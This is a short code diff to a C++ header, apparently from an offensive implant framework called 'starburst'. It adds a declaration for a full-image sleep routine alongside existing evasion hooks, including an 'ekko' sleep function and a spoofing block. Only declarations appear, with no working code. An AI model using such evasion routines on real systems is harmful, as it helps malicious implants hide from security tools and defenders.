@@ -54,6 +54,7 @@ namespace starburst {
     auto declfn evasion_on_cleanup( instance& inst ) -> void;
     auto declfn evasion_pre_sleep( instance& inst ) -> void;
     auto declfn evasion_post_sleep( instance& inst ) -> void;
+    auto declfn evasion_full_image_sleep( instance& inst, uint32_t sleep_ms ) -> void;
     auto declfn evasion_ekko_sleep( instance& inst, uint32_t sleep_ms ) -> void;
 
 #if defined(INCLUDE_EVASION_SPOOF) && defined(_WIN64)
